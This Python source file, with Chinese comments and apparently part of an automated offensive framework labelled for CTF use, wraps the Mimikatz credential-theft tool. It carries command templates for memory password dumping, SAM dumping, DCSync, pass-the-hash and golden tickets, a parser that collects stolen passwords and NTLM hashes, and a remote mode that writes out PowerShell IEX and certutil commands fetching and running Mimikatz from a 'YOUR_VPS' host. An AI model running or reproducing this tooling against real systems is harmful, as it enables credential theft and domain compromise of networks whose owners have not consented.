# tools/mimikatz_tool.py
"""
Mimikatz Tool - Windows凭据提取工具

功能:
- 内存凭据提取 (sekurlsa::logonpasswords)
- SAM数据库转储 (lsadump::sam)
- DCSync攻击 (lsadump::dcsync)
- Kerberos票据操作 (kerberos::*)
- Pass-the-Hash/Pass-the-Ticket

CTF场景优化:
- 自动解析凭据输出
- 支持远程执行 (通过shell会话)
"""
import re
import os
import json
import base64
import shutil
import subprocess
from typing import Dict, Any, Optional, List, Tuple
from dataclasses import dataclass
from tool_framework import CommandLineTool


@dataclass
class ExtractedCredential:
    """提取的凭据"""
    username: str
    domain: str = ""
    password: str = ""
    ntlm_hash: str = ""
    sha1_hash: str = ""
    ticket_path: str = ""
    cred_type: str = "unknown"  # password, ntlm, ticket, aes


class MimikatzTool(CommandLineTool):
    """
    Mimikatz Windows凭据提取工具封装

    重要：此工具需要Windows shell会话才能执行
    - 需要：Windows环境 + 管理员权限
    - 执行方式：本地Windows环境 或 远程shell会话

    CTF场景特点:
    - 自动解析凭据输出
    - 支持多种命令模式
    - 兼容不同执行环境
    """

    # 前置条件声明
    REQUIRES_CREDENTIALS = False  # 不需要预先有凭据，但它提取凭据
    REQUIRES_SHELL_SESSION = True  # 需要shell会话（Windows）
    TOOL_CATEGORY = "attacker"  # 攻击工具
    REQUIRES_OS = "windows"  # 需要Windows环境

    # 常用命令模板
    COMMANDS = {
        "logonpasswords": "sekurlsa::logonpasswords",
        "sam": "lsadump::sam",
        "dcsync": "lsadump::dcsync /domain:{domain} /user:{username}",
        "dcsync_all": "lsadump::dcsync /domain:{domain} /all",
        "tickets": "sekurlsa::tickets",
        "pth": "sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{ntlm}",
        "golden": "kerberos::golden /domain:{domain} /sid:{sid} /krbtgt:{krbtgt} /user:{username}",
        "export_tickets": "sekurlsa::tickets /export",
        "privilege_debug": "privilege::debug",
        "token_elevate": "token::elevate"
    }

    def __init__(self):
        # 检测 mimikatz 路径 - Dockerfile下载路径优先
        self.executable = None

        common_paths = [
            "/opt/tools/windows/mimikatz.exe",  # Dockerfile下载路径
            "/opt/tools/x64/mimikatz.exe",
            "/opt/tools/mimikatz/x64/mimikatz.exe",
            "mimikatz.exe",
            "./mimikatz.exe",
            "./tools/mimikatz.exe",
            "C:\\tools\\mimikatz.exe",
            os.path.expanduser("~/tools/mimikatz.exe"),
        ]

        for path in common_paths:
            if os.path.exists(path):
                self.executable = path
                break

        self.cmd_path = self.executable or "mimikatz.exe"
        super().__init__(self.cmd_path)
        self.timeout = 120

    def name(self) -> str:
        return "mimikatz"

    def description(self) -> str:
        return "Windows凭据提取工具，支持内存dump、DCSync、Kerberos攻击等。"

    def supported_vulns(self) -> list:
        return [
            "Credential Dumping",
            "Pass-the-Hash",
            "Pass-the-Ticket",
            "DCSync Attack",
            "Golden Ticket",
            "Silver Ticket"
        ]

    def check_available(self) -> bool:
        """检查 mimikatz 是否可用"""
        if self.executable and os.path.exists(self.executable):
            return True
        # Windows环境检查
        return shutil.which("mimikatz.exe") is not None

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "command": {
                "type": "str",
                "description": f"命令类型: {', '.join(self.COMMANDS.keys())}",
                "required": True
            },
            "domain": {
                "type": "str",
                "description": "目标域名 (DCSync等需要)",
                "required": False
            },
            "username": {
                "type": "str",
                "description": "目标用户名",
                "required": False
            },
            "ntlm": {
                "type": "str",
                "description": "NTLM哈希 (PTH需要)",
                "required": False
            },
            "sid": {
                "type": "str",
                "description": "域SID (Golden Ticket需要)",
                "required": False
            },
            "krbtgt": {
                "type": "str",
                "description": "krbtgt哈希 (Golden Ticket需要)",
                "required": False
            },
            "shell_session": {
                "type": "str",
                "description": "shell会话标识 (远程执行时)",
                "required": False
            },
            "raw_command": {
                "type": "str",
                "description": "原始mimikatz命令 (自定义执行)",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """
        执行 mimikatz 命令

        支持两种模式:
        1. 本地执行: 直接运行 mimikatz.exe
        2. 远程执行: 生成命令供shell会话执行
        """
        command_type = params.get("command")
        shell_session = params.get("shell_session")

        if params.get("raw_command"):
            # 自定义命令
            mimikatz_cmd = params["raw_command"]
        elif command_type in self.COMMANDS:
            # 预设命令
            template = self.COMMANDS[command_type]
            mimikatz_cmd = template.format(
                domain=params.get("domain", ""),
                username=params.get("username", ""),
                ntlm=params.get("ntlm", ""),
                sid=params.get("sid", ""),
                krbtgt=params.get("krbtgt", "")
            )
        else:
            return {"error": f"未知命令: {command_type}", "success": False}

        # 如果有shell会话，生成远程执行命令
        if shell_session:
            return self._generate_remote_command(mimikatz_cmd, params)

        # 本地执行
        return self._execute_local(mimikatz_cmd, params)

    def _execute_local(self, mimikatz_cmd: str, params: Dict) -> Dict:
        """本地执行 mimikatz"""
        if not self.check_available():
            return {
                "error": "mimikatz.exe 未找到",
                "success": False,
                "hint": "下载 mimikatz 并放到 tools/ 目录"
            }

        # 构建完整命令
        # mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
        full_cmd = [
            self.cmd_path,
            "privilege::debug",
            mimikatz_cmd,
            "exit"
        ]

        try:
            result = self._run_command(full_cmd, timeout=self.timeout, stream_output=True)
            stdout = result.get("stdout", "")

            # 解析凭据
            credentials = self._parse_output(stdout)

            return {
                "success": True,
                "command": mimikatz_cmd,
                "credentials": [vars(c) for c in credentials],
                "raw_output": stdout,
                "summary": f"提取到 {len(credentials)} 条凭据"
            }

        except Exception as e:
            return {"error": str(e), "success": False}

    def _generate_remote_command(self, mimikatz_cmd: str, params: Dict) -> Dict:
        """
        生成远程执行命令

        支持多种上传和执行方式:
        1. PowerShell IEX (内存加载)
        2. certutil 下载执行
        3. bitsadmin 下载执行
        """
        # 生成PowerShell内存加载命令 (Invoke-Mimikatz)
        powershell_cmd = f"""
IEX (New-Object Net.WebClient).DownloadString('http://YOUR_VPS/Invoke-Mimikatz.ps1');
Invoke-Mimikatz -Command '{mimikatz_cmd}'
"""

        # 生成certutil下载执行命令
        certutil_cmd = f"""
certutil -urlcache -split -f http://YOUR_VPS/mimikatz.exe C:\\temp\\m.exe
C:\\temp\\m.exe "privilege::debug" "{mimikatz_cmd}" "exit"
"""

        return {
            "success": True,
            "mode": "remote",
            "shell_session": params.get("shell_session"),
            "mimikatz_command": mimikatz_cmd,
            "execution_methods": {
                "powershell": powershell_cmd.strip(),
                "certutil": certutil_cmd.strip()
            },
            "notes": [
                "1. 将mimikatz上传到目标机器",
                "2. 执行 privilege::debug 获取权限",
                "3. 执行相应命令提取凭据",
                "注意: 需要管理员或SYSTEM权限"
            ]
        }

    def _parse_output(self, output: str) -> List[ExtractedCredential]:
        """解析 mimikatz 输出提取凭据"""
        credentials = []

        if not output:
            return credentials

        # 正则模式
        patterns = {
            # Username : Administrator
            # Domain   : CORP
            # Password : P@ssw0rd
            "logonpasswords": re.compile(
                r"Username\s*:\s*(\S+)\s*\n"
                r"Domain\s*:\s*(\S+)\s*\n"
                r".*?Password\s*:\s*(\S+)",
                re.DOTALL
            ),
            # NTLM     : 1234567890abcdef1234567890abcdef
            "ntlm": re.compile(
                r"Username\s*:\s*(\S+)\s*\n"
                r"Domain\s*:\s*(\S+)\s*\n"
                r".*?ntlm\s*:\s*([a-f0-9]+)",
                re.IGNORECASE | re.DOTALL
            ),
            # SHA1     : 1234567890abcdef1234567890abcdef12345678
            "sha1": re.compile(
                r"Username\s*:\s*(\S+)\s*\n"
                r".*?sha1\s*:\s*([a-f0-9]+)",
                re.IGNORECASE | re.DOTALL
            )
        }

        # 提取用户名/域/密码
        for match in patterns["logonpasswords"].finditer(output):
            username = match.group(1)
            domain = match.group(2)
            password = match.group(3)

            if password and password != "(null)":
                cred = ExtractedCredential(
                    username=username,
                    domain=domain,
                    password=password,
                    cred_type="password"
                )
                credentials.append(cred)

        # 提取NTLM哈希
        for match in patterns["ntlm"].finditer(output):
            username = match.group(1)
            domain = match.group(2)
            ntlm = match.group(3)

            # 检查是否已存在
            existing = next(
                (c for c in credentials if c.username == username and c.domain == domain),
                None
            )

            if existing:
                existing.ntlm_hash = ntlm
                if not existing.password:
                    existing.cred_type = "ntlm"
            else:
                cred = ExtractedCredential(
                    username=username,
                    domain=domain,
                    ntlm_hash=ntlm,
                    cred_type="ntlm"
                )
                credentials.append(cred)

        # 去重
        seen = set()
        unique_creds = []
        for c in credentials:
            key = f"{c.domain}\\{c.username}:{c.cred_type}"
            if key not in seen:
                seen.add(key)
                unique_creds.append(c)

        return unique_creds


def register():
    """注册 mimikatz 工具"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(MimikatzTool())